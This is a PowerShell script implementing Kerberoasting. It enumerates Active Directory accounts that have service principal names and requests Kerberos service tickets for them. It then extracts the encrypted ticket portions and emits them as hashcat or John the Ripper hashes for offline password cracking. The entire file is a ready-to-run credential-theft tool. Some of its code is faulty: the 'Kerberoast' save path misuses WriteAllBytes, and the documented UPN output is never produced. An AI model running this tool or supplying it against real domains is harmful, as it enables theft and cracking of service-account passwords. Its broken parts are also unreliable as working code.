function Invoke-OpSecRoast {
    <#
    .SYNOPSIS
        Enumerates SPNs in the domain (or specific container), requests Kerberos TGS (service tickets), and retrieves the encrypted portion.
    .DESCRIPTION
        This function queries Active Directory for SPNs associated with user accounts in the entire domain or in a specified container.
        It then requests a Kerberos TGS for each SPN found and returns the target account UPN, encryption type, and encrypted portion of the ticket.
    .PARAMETER ConvertTo
        Specifies the output format. Options are Hashcat, John, Kerberoast, and Dump.
    .PARAMETER SaveTo
        Specifies the file path to save the output.
    .PARAMETER Container
        Specifies an Active Directory container or OU in which to search for SPNs. Optional; if omitted, searches the entire domain.
    #>

    [CmdletBinding()]
    param (
        [ValidateSet("Hashcat", "John", "Kerberoast", "Dump")]
        [string]$ConvertTo,
        [string]$SaveTo,
        [string]$Container
    )

    Begin {
        $SPNList = @()

        if ($Container) {
            Write-Verbose "Enumerating SPNs in container: $Container"
            try {
                $ContainerPath = "LDAP://$Container"
                $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$ContainerPath)
            } catch {
                Write-Error "Could not access container: $Container. Please check the path format."
                return
            }
        } else {
            Write-Verbose "Enumerating SPNs in the entire domain"
            $SearchScope = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            $Path = 'GC://DC=' + ($SearchScope.RootDomain -Replace ("\.", ',DC='))
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$Path)
        }

        # Configure search filter and properties to load
        $Searcher.PageSize = 500
        $Searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
        $Searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
        $Searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null

        # Perform the search
        $SearchResults = $Searcher.FindAll()
        foreach ($Result in $SearchResults) {
            if ($Result.Properties.serviceprincipalname) {
                foreach ($SPN in $Result.Properties.serviceprincipalname) {
                    $SPNList += $SPN
                }
            }
        }

        Add-Type -AssemblyName System.IdentityModel
        $CrackList = @()
        Write-Verbose "Starting to request TGS for each SPN found"
    }

    Process {
        foreach ($SPN in $SPNList) {
            $TargetAccount = "N/A"
            Write-Verbose "Requesting TGS for the SPN: $SPN"
            $ByteStream = $null
            try {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
                $ByteStream = $Ticket.GetRequest()
            } catch {
                Write-Warning "Could not request TGS for the SPN: $SPN"
            }

            if ($ByteStream) {
                $HexStream = [System.BitConverter]::ToString($ByteStream) -replace "-"
                $eType = [Convert]::ToInt32(($HexStream -replace ".*A0030201")[0..1] -join "", 16)
                $EncType = switch ($eType) {
                    1 {"DES-CBC-CRC (1)"}
                    3 {"DES-CBC-MD5 (3)"}
                    17 {"AES128-CTS-HMAC-SHA-1 (17)"}
                    18 {"AES256-CTS-HMAC-SHA-1 (18)"}
                    23 {"RC4-HMAC (23)"}
                    default {"Unknown ($eType)"}
                }
                $EncPart = $HexStream -replace ".*048204.." -replace "A48201.*"
                $Target = New-Object psobject -Property @{
                    SPN            = $SPN
                    EncryptionType = $EncType
                    EncTicketPart  = $EncPart  
                } | Select-Object SPN, EncryptionType, EncTicketPart
                $CrackList += $Target    
            }
        }
    }

    End {
        if (!$CrackList.EncTicketPart) {
            Write-Error "No TGS tickets were retrieved!"
            return
        }

        if ($ConvertTo) {
            if ($ConvertTo -eq "Hashcat") {
                $Output = @()
                Write-Verbose "Converting to Hashcat format"
                foreach ($Object in $CrackList) {
                    if ($Object.EncryptionType -eq "RC4-HMAC (23)") {
                        $Output += "`$krb5tgs`$23`$" + $Object.EncTicketPart.Substring(0, 32) + "`$" + $Object.EncTicketPart.Substring(32)
                    } else {
                        Write-Warning "Hashcat supports only RC4-HMAC at the moment!"
                    }
                }
            } elseif ($ConvertTo -eq "John") {
                $Output = @()
                Write-Verbose "Converting to John format"
                foreach ($Object in $CrackList) {
                    if ($Object.EncryptionType -eq "RC4-HMAC (23)") {
                        $Output += "`$krb5tgs`$23`$" + $Object.EncTicketPart.Substring(32) + "`$" + $Object.EncTicketPart.Substring(0, 32)  
                    } else {
                        Write-Warning "John supports only RC4-HMAC at the moment!"
                    }
                }
            } elseif ($ConvertTo -eq "Kerberoast" -and $SaveTo) {
                Write-Verbose "Converting to Kerberoast format"
                [string]$Output = $CrackList.EncTicketPart -join "`n"
                [io.file]::WriteAllBytes($Output, $SaveTo)
                Write-Verbose "File saved to: $SaveTo" 
                return
            } elseif ($ConvertTo -eq "Dump") {
                Write-Verbose "Dumping TGS tickets"
                $Output = @($CrackList.EncTicketPart)
            }
        } else {
            $Output = $CrackList
        }

        if ($SaveTo) {
            $Output | Out-File -FilePath $SaveTo -Encoding utf8
            Write-Verbose "File saved to: $SaveTo" 
        } else {
            return $Output 
        }
    }
}
